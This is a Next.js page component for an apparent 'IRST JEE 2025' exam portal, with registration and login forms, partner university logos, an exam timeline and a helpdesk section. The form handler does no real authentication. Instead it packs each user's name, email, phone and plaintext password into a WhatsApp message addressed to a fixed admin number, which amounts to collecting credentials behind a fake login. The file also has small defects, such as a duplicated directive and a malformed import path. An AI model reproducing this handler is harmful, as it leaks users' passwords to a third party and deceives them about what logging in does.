"use client";
"use client";
import Image from "next/image";
import React from "react";
import { useState } from "react";
import Navbar from "../../app/navbar/page ";
import NewsletterSection from "../../app/NewsletterSection/page";

export default function IJeeHero() {
  const [isLogin, setIsLogin] = useState(false);
  const [form, setForm] = useState({
    name: "",
    email: "",
    phone: "",
    password: "",
  });

  const handleChange = (e) => {
    setForm({ ...form, [e.target.name]: e.target.value });
  };

  const handleSubmit = (e) => {
    e.preventDefault();

    const adminNumber = "919543788999";
    const text = isLogin
      ? `User Login Attempt:%0A📧 Email: ${form.email}%0A🔑 Password: ${form.password}`
      : `New IRST JEE 2025 Registration:%0A👤 Name: ${form.name}%0A📧 Email: ${form.email}%0A📞 Phone: ${form.phone}%0A🔑 Password: ${form.password}`;

    window.open(`https://wa.me/${adminNumber}?text=${text}`, "_blank");

    alert(
      isLogin
        ? "Login details ready to send on WhatsApp!"
        : "Registration details ready to send on WhatsApp!"
    );

    setForm({ name: "", email: "", phone: "", password: "" });
  };

  return (
    <>
      <Navbar />
      {/* ================= MAIN HERO BANNER (TOP SECTION) ================= */}
      <section className="w-full bg-gradient-to-r from-green-50 to-yellow-50 text-center py-16 md:py-24">
        <div className="max-w-4xl mx-auto px-4">
          <h1 className="text-5xl md:text-6xl font-extrabold bg-gradient-to-r from-green-700 via-yellow-600 to-green-700 bg-clip-text text-transparent">
            IRST JEE 2025
          </h1>
         <p className="mt-6 text-lg md:text-xl text-gray-700">
  {`Embark on your journey to excellence at India's premier engineering institution`}
</p>

         <p className="mt-4 text-green-700 font-semibold text-lg md:text-xl">
  {`Shaping Tomorrow's Leaders Today`}
</p>


          {/* Small decorative dots */}
          <div className="flex justify-center gap-2 mt-5">
            <span className="w-3 h-3 bg-green-600 rounded-full"></span>
            <span className="w-3 h-3 bg-yellow-400 rounded-full"></span>
            <span className="w-3 h-3 bg-green-600 rounded-full"></span>
          </div>
        </div>
      </section>

      {/* ================= HERO SECTION ================= */}
      <section className="flex flex-col-reverse md:flex-row w-full min-h-screen bg-white">
        {/* LEFT PANEL - FORM */}
        <div className="w-full md:w-1/2 flex flex-col justify-center items-center p-6 md:p-16">
          <div className="w-full max-w-md bg-white shadow-lg rounded-2xl p-8 border">
            <h1 className="text-3xl font-bold text-center text-gray-800 mb-2">
              IRST JEE
            </h1>
            <p className="text-center text-gray-600 mb-8">
              {isLogin
                ? "Welcome back! Please login to your account."
                : "Create your IRST JEE account and start your journey."}
            </p>

            <form onSubmit={handleSubmit} className="space-y-5">
              {!isLogin && (
                <>
                  <div>
                    <input
                      type="text"
                      name="name"
                      placeholder="Full Name"
                      value={form.name}
                      onChange={handleChange}
                      className="w-full border rounded-lg px-4 py-3 focus:ring-2 focus:ring-green-500 outline-none"
                      required
                    />
                  </div>
                  <div>
                    <input
                      type="tel"
                      name="phone"
                      placeholder="Mobile Number"
                      value={form.phone}
                      onChange={handleChange}
                      className="w-full border rounded-lg px-4 py-3 focus:ring-2 focus:ring-green-500 outline-none"
                      required
                    />
                  </div>
                </>
              )}

              <div>
                <input
                  type="email"
                  name="email"
                  placeholder="Email Address"
                  value={form.email}
                  onChange={handleChange}
                  className="w-full border rounded-lg px-4 py-3 focus:ring-2 focus:ring-green-500 outline-none"
                  required
                />
              </div>
              <div>
                <input
                  type="password"
                  name="password"
                  placeholder="Password"
                  value={form.password}
                  onChange={handleChange}
                  className="w-full border rounded-lg px-4 py-3 focus:ring-2 focus:ring-green-500 outline-none"
                  required
                />
              </div>

              <button
                type="submit"
                className="w-full bg-green-600 hover:bg-green-700 text-white py-3 rounded-lg font-semibold transition"
              >
                {isLogin ? "Log In" : "Register"}
              </button>
            </form>

            <p className="text-center text-gray-600 mt-5 text-sm md:text-base">
              {isLogin ? (
                <>
                  Don’t have an account?{" "}
                  <button
                    onClick={() => setIsLogin(false)}
                    className="text-green-600 font-semibold"
                  >
                    Register here
                  </button>
                </>
              ) : (
                <>
                  Already registered?{" "}
                  <button
                    onClick={() => setIsLogin(true)}
                    className="text-green-600 font-semibold"
                  >
                    Login
                  </button>
                </>
              )}
            </p>
          </div>
        </div>

        {/* RIGHT PANEL - INFO */}
        <div className="w-full md:w-1/2 bg-gradient-to-r from-green-600 to-green-500 flex flex-col justify-center text-white px-6 md:px-16 py-12 md:py-20">
          <div className="text-center md:text-left">
            <h2 className="text-3xl font-extrabold mb-4">
              Welcome to IRST JEE Portal
            </h2>
            <p className="text-lg mb-8 text-green-50">
              Access your personalized dashboard and start your journey towards
              success.
            </p>

            <ul className="space-y-4 text-green-50">
              <li className="flex items-center justify-center md:justify-start gap-3">
                ✅ <span>Track your progress</span>
              </li>
              <li className="flex items-center justify-center md:justify-start gap-3">
                ✅ <span>Access study materials</span>
              </li>
              <li className="flex items-center justify-center md:justify-start gap-3">
                ✅ <span>Take mock tests</span>
              </li>
            </ul>
          </div>
        </div>
      </section>

      {/* ================= HERO TITLE BELOW FORM (mobile only) ================= */}
      <div className="block md:hidden text-center mt-10 px-4">
        <h1 className="text-4xl font-extrabold bg-gradient-to-r from-green-700 via-yellow-600 to-green-700 bg-clip-text text-transparent">
          IRST JEE 2025
        </h1>
      <p className="mt-3 text-gray-700 text-sm">
  {`Embark on your journey to excellence at India's premier engineering institution.`}
</p>

      </div>

   
      {/* ================= PARTNER UNIVERSITIES ================= */}
      <section className="max-w-6xl mx-auto text-center px-4 py-16">
        <h2 className="text-3xl font-extrabold text-green-800 mb-10">
          Our Partner Universities
        </h2>

        <div className="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-4 gap-6">
          {[
            "imgi_54_jeppiaar-logo.png",
            "imgi_34_images.png",
            "imgi_32_images.png",
            "imgi_31_354e41b970004cac05cbe77bbc681ad8.png",
            "imgi_25_GNU-logo.png",
            "imgi_23_cropped-fav-icon.png",
            "imgi_20_1200px-KL_University_logo.svg.png",
            "imgi_18_maxresdefault.jpg",
            "imgi_17_1697893430.jpg",
            "imgi_16_JU_Logo_-_High_weight_-semper_ceCLx5r.png",
            "imgi_14_Bharath_University_Logo.png",
            "imgi_12_amrita-vishwa-vidyapeetham-university-logo-2024.jpg",
            "imgi_11_c6c2e9022f25f404fe108a4cfefab222.jpg",
            "imgi_10_srm-logo.svg.svg",
            "/imgi_11_c6c2e9022f25f404fe108a4cfefab222.jpg",
            "/imgi_14_Bharath_University_Logo.png",
          ].map((filename, i) => (
            <div
              key={i}
              className="border border-yellow-200 p-4 rounded-xl shadow-sm hover:shadow-md transition"
            >
              <Image
                src={`/college logo/${filename}`} // ✅ correct folder path
                alt={`University ${i + 1}`}
                className="w-full h-16 md:h-20 object-contain mb-2"
              />
            </div>
          ))}
        </div>
      </section>

      {/* ================= EXAM TIMELINE ================= */}
      <section className="max-w-6xl mx-auto bg-white p-6 md:p-10 rounded-2xl shadow-md">
        <h2 className="text-3xl font-extrabold text-green-800 mb-6 text-center">
          📅 Exam Timeline
        </h2>
        <div className="overflow-x-auto">
          <table className="w-full text-center border border-gray-200 text-sm md:text-base">
            <thead className="bg-gradient-to-r from-green-200 to-yellow-200">
              <tr>
                <th className="p-3">Phase</th>
                <th className="p-3">Exam Dates</th>
                <th className="p-3">Application Deadline</th>
              </tr>
            </thead>
            <tbody>
              <tr className="border-t">
                <td className="p-3 font-semibold">Phase 1</td>
                <td>22.04.2025 – 27.04.2025</td>
                <td>10.04.2025</td>
              </tr>
              <tr className="border-t">
                <td className="p-3 font-semibold">Phase 2</td>
                <td>12.06.2025 – 17.06.2025</td>
                <td>04.06.2025</td>
              </tr>
              <tr className="border-t">
                <td className="p-3 font-semibold">Phase 3</td>
                <td>04.07.2025 – 06.07.2025</td>
                <td>30.06.2025</td>
              </tr>
            </tbody>
          </table>
        </div>
      </section>

      {/* ================= ABOUT & RANKINGS ================= */}
      <section className="max-w-6xl mx-auto text-center px-4 py-16">
        <h2 className="text-3xl font-extrabold text-green-800 mb-10">
          About IRST
        </h2>
        <div className="grid grid-cols-2 md:grid-cols-4 gap-8">
          <div>
            <h3 className="text-2xl font-bold text-green-700">52,000+</h3>
            <p>Students</p>
          </div>
          <div>
            <h3 className="text-2xl font-bold text-green-700">950+</h3>
            <p>International Students</p>
          </div>
          <div>
            <h3 className="text-2xl font-bold text-green-700">3,200+</h3>
            <p>Faculty</p>
          </div>
          <div>
            <h3 className="text-2xl font-bold text-green-700">200+</h3>
            <p>Research Labs</p>
          </div>
        </div>
      </section>


      {/* ================= HELPDESK ================= */}
      <section className="bg-green-50 py-10 text-center rounded-xl shadow-inner max-w-4xl mx-auto mb-10 px-4">
        <h3 className="text-2xl font-bold text-green-800 mb-3">HelpDesk</h3>
        <p>📞 +91 9155234444 | 📧 admissions@irst.edu.in</p>
        <p>Support Hours: Mon–Sat | 9:00 AM – 5:00 PM</p>
      </section>
       <NewsletterSection />
    </>
  );
}
